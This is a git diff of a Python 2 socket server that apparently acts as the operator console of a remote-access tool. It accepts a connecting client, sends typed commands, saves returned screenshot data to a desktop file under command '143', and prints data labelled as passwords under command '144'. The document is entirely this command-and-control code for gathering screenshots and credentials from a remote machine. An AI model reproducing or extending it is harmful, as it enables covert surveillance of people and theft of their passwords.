@@ -1,5 +1,4 @@
 import socket
-import util
 import sys
 import signal
 
@@ -25,22 +24,28 @@ def getSizeOfCommand(s):
         size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
     return size
 
-f = open('/Users/matt/Desktop/pic.jpg','w')
-
-host = '' 
+host = 'localhost' 
 port = 5715 
 backlog = 5
 size = 1
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((host,port))
 s.listen(backlog)
+client, address = s.accept()
+
 while 1:
-    client, address = s.accept()
-    inp = raw_input("Enter command: ")
-    inp = "!" + str(len(inp)) + "!" + inp
+    cmd = raw_input("Enter command: ")
+    inp = "!" + str(len(cmd)) + "!" + cmd
     client.send(inp)
-    for i in range(0,1):
+    if cmd == "143": #screenshot
         size = getSizeOfCommand(client)
         data = client.recv(size)
+        f = open('/Users/matt/Desktop/pic.jpg','w')
         f.write(data)
         f.close()
+    elif cmd == "144": #passwords
+        size = getSizeOfCommand(client)
+        data = client.recv(size)
+        print data
+    else:
+        print "what"
